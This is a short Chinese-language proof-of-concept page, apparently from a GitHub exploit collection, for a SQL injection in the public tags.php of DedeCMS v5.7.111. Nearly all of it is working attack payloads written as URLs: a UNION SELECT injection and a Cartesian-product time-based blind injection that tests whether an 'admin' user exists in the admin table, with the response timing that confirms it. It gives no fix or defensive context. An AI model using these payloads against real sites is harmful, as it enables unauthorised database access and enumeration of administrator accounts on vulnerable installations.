
## Dedecms v5.7.111前台tags.php SQL注入漏洞


## 影响版本：
```
v5.7.111，或打补丁的历史版本
```

## poc
```
http://x.com/tags.php?tag=a/alias/about%27and{`\%27`%20id}%3E0.1union%20select%201,2,3,4,5,6,7,8,9,10,11--%20\\

/tags.php?tag=a/alias/about%27and{`\%27`%20id}%3E0.1+or+if(exists(select+*+from+%23@__admin+where+userid+like'admin'),(select+count(*)+from+information_schema.tables+A,information_schema.tables+B),1)--%20\\
```

![image](https://github.com/wy876/POC/assets/139549762/568076a5-4ad2-4cf6-89a4-60d02d464222)

## 笛卡尔积 盲注
```
/tags.php?tag=a/alias/about%27and{`\%27`%20id}%3E0.1+or+if(exists(select+*+from+%23@__admin+where+userid+like'admin'),(select+count(*)+from+information_schema.tables+A,information_schema.tables+B),1)--%20\\
```
当 admin表userid 存在admin时，响应时间为下图右下角的 5539 ms
![image](https://github.com/wy876/POC/assets/139549762/ac170e5f-a085-4dc6-affb-94ffb99f69d8)
